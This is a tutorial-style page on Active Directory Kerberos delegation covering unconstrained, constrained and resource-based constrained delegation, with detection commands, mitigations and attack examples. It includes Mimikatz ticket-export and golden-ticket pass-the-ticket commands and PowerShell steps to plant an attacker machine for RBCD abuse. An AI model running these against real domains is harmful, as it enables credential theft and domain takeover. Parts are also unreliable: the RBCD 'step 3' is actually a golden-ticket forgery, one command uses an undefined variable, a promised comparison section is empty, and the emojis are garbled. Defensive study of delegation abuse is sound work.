# 1.4 Active Directory Delegation

## Active Directory Delegation

### **ğŸ”¥ Active Directory Delegation Explained (With Attacks & Exploits) ğŸ”¥**

**Delegation** is a powerful **Kerberos authentication** feature that allows a **service to authenticate on behalf of a user**. It's used in AD to enable **Single Sign-On (SSO)**. **If delegation is misconfigured**, then **privilege escalation and domain takeover** are possible. ğŸ˜ˆ

***

### **ğŸ’¡ Types of Delegation (3 Types)**

There are **3 types of delegation** in AD:

#### **1ï¸âƒ£ Unconstrained Delegation (ğŸš¨ Most Dangerous)**

**What is it?**

* When a service has **Unconstrained Delegation** enabled, it can **store any user's Kerberos TGT**.
* If an **attacker gains machine access**, they can **steal a Domain Admin's TGT** and fully compromise the domain!

**How to Check?**

powershell

```powershell
Get-ADObject -Filter {userAccountControl -band 0x80000} -Properties Name
```

ğŸ‘‰ **Accounts that are returned have Unconstrained Delegation enabled.**

**Exploitation (Attack Example)**

If an **attacker gains SYSTEM access on an unconstrained delegation enabled machine**, they can **extract TGTs using Mimikatz**:

powershell

```powershell
mimikatz.exe privilege::debug sekurlsa::tickets /export
```

ğŸ‘‰ **If a Domain Admin ticket is found, full DA compromise is possible!** ğŸš€

**Mitigation:**

âŒ **Disable** Unconstrained delegation.\
âœ… **Allow delegation only for necessary services**.\
âœ… **Never enable Unconstrained Delegation on Domain Controllers!**

***

#### **2ï¸âƒ£ Constrained Delegation (More Secure but Still Exploitable)**

**What is it?**

* **Constrained Delegation** restricts authentication to specific services.
* This means a **service can only authenticate on behalf of users to certain specified services**.

**How to Check?**

powershell

```powershell
Get-ADObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
```

ğŸ‘‰ **This command will show which accounts have Constrained Delegation enabled.**

**Exploitation (Attack Example)**

**If an attacker gains access to an account with Constrained Delegation**, they will check **which services they can delegate to**:

powershell

```powershell
Get-ADUser -Identity <USERNAME> -Properties msDS-AllowedToDelegateTo
```

ğŸš€ **If the attacker exploits delegation to a specific service, lateral movement is possible!**

**Mitigation:**

âœ… **Allow delegation only to trusted services.**\
âœ… **Monitor which accounts have delegation enabled.**\
âœ… **Keep passwords strong for accounts with Constrained Delegation.**

***

#### **3ï¸âƒ£ Resource-Based Constrained Delegation (RBCD) (Modern & Exploitable)**

**What is it?**

* This is a **modern version of Constrained Delegation** where the **destination service decides** who can authenticate on its behalf.
* This means **the resource itself (e.g., File Server, SQL Server) determines** who gets delegation permissions.

**How to Check?**

powershell

```powershell
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"}
```

ğŸ‘‰ **If there's output, RBCD is enabled on that machine.**

**Exploitation (RBCD Attack)**

If an **attacker can enforce authentication from one machine to another on behalf of another machine**, lateral movement is possible!

ğŸš€ **Step 1: The attacker creates their machine account:**

powershell

```powershell
New-ADComputer -Name "AttackerMachine" -SamAccountName "AttackerMachine" -Instance $Comp -PassThru
```

ğŸš€ **Step 2: The attacker adds their machine to "AllowedToActOnBehalfOfOtherIdentity":**

powershell

```powershell
Set-ADComputer -Identity "VictimServer" -PrincipalsAllowedToDelegateToAccount "AttackerMachine"
```

ğŸš€ **Step 3: Inject a ticket using Mimikatz to gain access:**

powershell

```powershell
mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /target:<DC_IP> /rc4:<NTLM_HASH> /user:Administrator /ptt
```

ğŸ”¥ **Boom! The attacker has abused RBCD to gain full control!**

**Mitigation:**

âœ… **Monitor who is using "msDS-AllowedToActOnBehalfOfOtherIdentity".**\
âœ… **Use RBCD only for trusted services.**\
âœ… **Follow strong password policies.**

***

### **ğŸ›¡ Delegation Attacks vs. Kerberoasting**

```
```

***

### **ğŸ”¥ Final Thoughts**

âœ… **Unconstrained Delegation is the riskiest**, as it can **steal a Domain Admin's TGT**.\
âœ… **RBCD exploitation** is quite advanced, but useful for **real-world lateral movement**.\
âœ… **Constrained Delegation is better, but attacks are still possible if misconfigured.**\
âœ… **Monitoring & mitigation** are essential to detect delegation-based attacks.
